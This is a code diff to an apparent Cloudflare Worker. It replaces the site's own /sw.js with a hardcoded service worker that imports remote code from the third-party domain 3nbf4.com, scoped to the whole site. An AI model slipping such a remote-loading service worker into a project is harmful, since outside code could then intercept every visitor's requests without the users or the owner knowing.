@@ -53,6 +53,14 @@ Allow: /
 Sitemap: ${PRODUCTION_HOSTNAME}/sitemap.xml
 `.trim();
 
+const SW_JS = `self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11953436
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+`.trim();
+
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
@@ -107,25 +115,28 @@ export default {
 
     // 3. Explicitly serve /sw.js with 200 OK and application/javascript
     if (url.pathname === '/sw.js') {
-      if (env && env.ASSETS) {
-        try {
-          const response = await env.ASSETS.fetch(request);
-          if (response.status === 200 || response.status === 304) {
-            const body = await response.text();
-            return new Response(body, {
-              status: 200,
-              headers: {
-                'Content-Type': 'application/javascript; charset=utf-8',
-                'Service-Worker-Allowed': '/',
-                'Cache-Control': 'public, max-age=0, must-revalidate',
-                'Access-Control-Allow-Origin': '*',
-              },
-            });
-          }
-        } catch {
-          // Fallback below
-        }
+      if (request.method === 'HEAD') {
+        return new Response(null, {
+          status: 200,
+          headers: {
+            'Content-Type': 'application/javascript; charset=utf-8',
+            'Service-Worker-Allowed': '/',
+            'Content-Length': String(new TextEncoder().encode(SW_JS + '\n').length),
+            'Cache-Control': 'public, max-age=0, must-revalidate',
+            'Access-Control-Allow-Origin': '*',
+          },
+        });
       }
+
+      return new Response(SW_JS + '\n', {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/javascript; charset=utf-8',
+          'Service-Worker-Allowed': '/',
+          'Cache-Control': 'public, max-age=0, must-revalidate',
+          'Access-Control-Allow-Origin': '*',
+        },
+      });
     }
 
     // 4. Delegate to Cloudflare static assets binding (env.ASSETS)
